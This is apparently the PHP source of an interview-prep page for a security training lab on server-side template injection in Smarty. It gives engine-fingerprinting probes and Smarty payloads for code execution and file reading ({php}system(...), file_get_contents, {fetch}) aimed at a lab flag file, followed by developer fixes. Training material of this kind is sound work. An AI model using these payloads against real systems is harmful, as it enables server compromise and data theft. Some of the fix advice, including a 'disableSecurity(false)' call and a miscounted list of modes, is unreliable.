<?php
require_once __DIR__ . '/includes/helpers.php';
$page_title = 'S4 Interview Prep — Engine Fingerprinting: Smarty';
include __DIR__ . '/includes/header.php';
?>

<div class="page">
  <div class="interview-page">

    <div style="margin-bottom:24px;">
      <a href="/ssti_s4.php" style="font-size:0.82rem;color:var(--text-muted);">&larr; Back to Lab S4</a>
      &nbsp;&nbsp;
      <a href="/index.php" style="font-size:0.82rem;color:var(--text-muted);">Hub</a>
    </div>

    <div class="interview-section">
      <h1 style="font-size:1.4rem;margin-bottom:6px;">Lab S4 — Engine Fingerprinting: Smarty</h1>
      <p style="color:var(--text-muted);font-size:0.875rem;">Interview Prep · Multi-Engine SSTI Methodology</p>
    </div>

    <!-- 30-Second Explanation -->
    <div class="interview-section">
      <h2>30-Second Explanation</h2>
      <div class="thirty-sec">
        Engine fingerprinting is essential: SSTI payloads are engine-specific. An exploit chain that works against Twig will fail silently against Smarty, and vice versa. Probe with syntax from multiple engine families, identify which one evaluates correctly, then apply the appropriate exploit. Getting this wrong wastes time and may miss a valid vulnerability entirely.
      </div>
    </div>

    <!-- Common Interview Questions -->
    <div class="interview-section">
      <h2>Common Interview Questions</h2>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="s4q1">
        <label class="qa-question" for="s4q1">Name engine-specific SSTI detection payloads and what they identify.</label>
        <div class="qa-answer">
          <table style="width:100%;font-size:0.82rem;border-collapse:collapse;margin-top:8px;">
            <thead>
              <tr style="border-bottom:1px solid var(--border);color:var(--text-dim);">
                <th style="text-align:left;padding:5px 8px;">Payload</th>
                <th style="text-align:left;padding:5px 8px;">Expected Output</th>
                <th style="text-align:left;padding:5px 8px;">Engine</th>
              </tr>
            </thead>
            <tbody style="color:var(--text-muted);">
              <tr style="border-bottom:1px solid var(--border);">
                <td style="padding:5px 8px;font-family:var(--font-mono);">{{7*7}}</td>
                <td style="padding:5px 8px;">49</td>
                <td style="padding:5px 8px;">Jinja2 / Twig</td>
              </tr>
              <tr style="border-bottom:1px solid var(--border);">
                <td style="padding:5px 8px;font-family:var(--font-mono);">{{7*'7'}}</td>
                <td style="padding:5px 8px;">49 (Jinja2) / 7777777 (Twig)</td>
                <td style="padding:5px 8px;">Distinguishes Jinja2 vs Twig</td>
              </tr>
              <tr style="border-bottom:1px solid var(--border);">
                <td style="padding:5px 8px;font-family:var(--font-mono);">{$smarty.version}</td>
                <td style="padding:5px 8px;">3.1.x</td>
                <td style="padding:5px 8px;">Smarty</td>
              </tr>
              <tr style="border-bottom:1px solid var(--border);">
                <td style="padding:5px 8px;font-family:var(--font-mono);">${7*7}</td>
                <td style="padding:5px 8px;">49</td>
                <td style="padding:5px 8px;">FreeMarker / Thymeleaf</td>
              </tr>
              <tr>
                <td style="padding:5px 8px;font-family:var(--font-mono);">&lt;%= 7*7 %&gt;</td>
                <td style="padding:5px 8px;">49</td>
                <td style="padding:5px 8px;">ERB (Ruby) / EJS (Node)</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="s4q2">
        <label class="qa-question" for="s4q2">How do you exploit Smarty once identified?</label>
        <div class="qa-answer">
          <strong>Smarty 3 with <code>PHP_ALLOW</code></strong> (as in S4): Use the <code>{php}{/php}</code> block to execute arbitrary PHP:
          <div class="oneliner" style="margin:10px 0;">{php}echo file_get_contents('/flags/lab_s4.txt');{/php}</div>
          <div class="oneliner" style="margin:10px 0;">{php}system('cat /flags/lab_s4.txt');{/php}</div>
          <br>
          <strong>Smarty 3/4 without PHP_ALLOW</strong>: Smarty still exposes internal objects through its template variables. More advanced chains include using <code>{$smarty.template_object}</code> to traverse to callable methods, or using Smarty's built-in functions like <code>{fetch}</code> (if enabled) to read local files:<br>
          <div class="oneliner" style="margin:10px 0;">{fetch file="/flags/lab_s4.txt"}</div>
          <br>
          <strong>Smarty 4</strong>: The <code>{php}</code> tag was removed. Exploitation relies on object traversal chains via <code>{$smarty.template_object}</code> and similar internal references.
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="s4q3">
        <label class="qa-question" for="s4q3">What is the correct methodology for SSTI when the engine is unknown?</label>
        <div class="qa-answer">
          <ol style="padding-left:1.2em;line-height:1.9;margin-top:8px;">
            <li>Submit <code>{{7*7}}</code> — if 49 returned, likely Twig or Jinja2.</li>
            <li>If not, try <code>${7*7}</code> — if 49, likely FreeMarker or Thymeleaf.</li>
            <li>Try <code>{$smarty.version}</code> — if version string returned, it's Smarty.</li>
            <li>Try <code>&lt;%= 7*7 %&gt;</code> — if 49, likely ERB/EJS.</li>
            <li>Once engine confirmed, research and apply engine-specific exploit chains.</li>
            <li>Always verify against the specific installed version — check <code>composer.lock</code>, <code>Gemfile.lock</code>, <code>package.json</code>, or server headers for version clues.</li>
          </ol>
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="s4q4">
        <label class="qa-question" for="s4q4">How does Smarty's <code>php_handling</code> setting affect exploitability?</label>
        <div class="qa-answer">
          Smarty 3 has three modes for PHP tag handling:
          <ul style="padding-left:1.2em;line-height:1.9;margin-top:8px;">
            <li><code>PHP_PASSTHRU</code> (default): <code>{php}</code> tags are output as-is (not executed).</li>
            <li><code>PHP_QUOTE</code>: PHP tags are HTML-encoded and output as literal text.</li>
            <li><code>PHP_ALLOW</code>: PHP tags are executed — <strong>critically dangerous if user-controlled input reaches the template</strong>.</li>
            <li><code>PHP_REMOVE</code>: PHP tags are silently stripped.</li>
          </ul>
          Lab S4 uses <code>PHP_ALLOW</code> deliberately. In real assessments, finding <code>PHP_ALLOW</code> in the source code or config is a critical red flag.
        </div>
      </div>
    </div>

    <!-- One-Liners -->
    <div class="interview-section">
      <h2>Smarty Exploit Payloads</h2>
      <div style="display:flex;flex-direction:column;gap:8px;">
        <div>
          <div style="font-size:0.75rem;color:var(--text-dim);margin-bottom:3px;">Engine probe</div>
          <div class="oneliner">{$smarty.version}</div>
        </div>
        <div>
          <div style="font-size:0.75rem;color:var(--text-dim);margin-bottom:3px;">RCE via {php} block — file read</div>
          <div class="oneliner">{php}echo file_get_contents('/flags/lab_s4.txt');{/php}</div>
        </div>
        <div>
          <div style="font-size:0.75rem;color:var(--text-dim);margin-bottom:3px;">RCE via {php} block — system command</div>
          <div class="oneliner">{php}system('cat /flags/lab_s4.txt');{/php}</div>
        </div>
        <div>
          <div style="font-size:0.75rem;color:var(--text-dim);margin-bottom:3px;">File read via Smarty {fetch} (no PHP_ALLOW needed)</div>
          <div class="oneliner">{fetch file="/flags/lab_s4.txt"}</div>
        </div>
      </div>
    </div>

    <!-- Developer Fix -->
    <div class="interview-section">
      <h2>Developer Fix</h2>
      <div style="font-size:0.875rem;color:var(--text-muted);line-height:1.7;">
        <ul style="padding-left:1.2em;line-height:1.9;">
          <li>Never set <code>php_handling = PHP_ALLOW</code> in production — or on any application that receives user input.</li>
          <li>Do not concatenate user input into Smarty template strings. Use <code>$smarty->assign('name', $name)</code> and reference <code>{$name}</code> in a static template file.</li>
          <li>Disable the <code>{fetch}</code> function if local file system access is not required.</li>
          <li>Use Smarty's <code>$smarty->disableSecurity(false)</code> — keep security mode enabled to restrict accessible directories, PHP execution, and dangerous functions.</li>
        </ul>
      </div>
    </div>

    <!-- Red Flags -->
    <div class="interview-section">
      <h2>Interview Red Flags</h2>
      <div style="display:flex;flex-direction:column;gap:8px;">
        <div class="red-flag-item">&#9888; Only knowing Twig/Jinja2 payloads — real apps use many different template engines.</div>
        <div class="red-flag-item">&#9888; Skipping fingerprinting and trying all payloads randomly — wastes time and may cause errors that alert defenders.</div>
        <div class="red-flag-item">&#9888; Not knowing that <code>{{7*7}}</code> passes through Smarty as a literal string — a common "it's not vulnerable" false negative.</div>
        <div class="red-flag-item">&#9888; Being unaware of the <code>php_handling</code> configuration option and its security implications.</div>
      </div>
    </div>

    <div style="margin-top:24px;">
      <a href="/ssti_s4.php" class="btn btn-primary btn-sm">Go to Lab S4</a>
      &nbsp;
      <a href="/index.php" class="btn btn-ghost btn-sm">Hub</a>
    </div>

  </div>
</div>

<?php include __DIR__ . '/includes/footer.php'; ?>
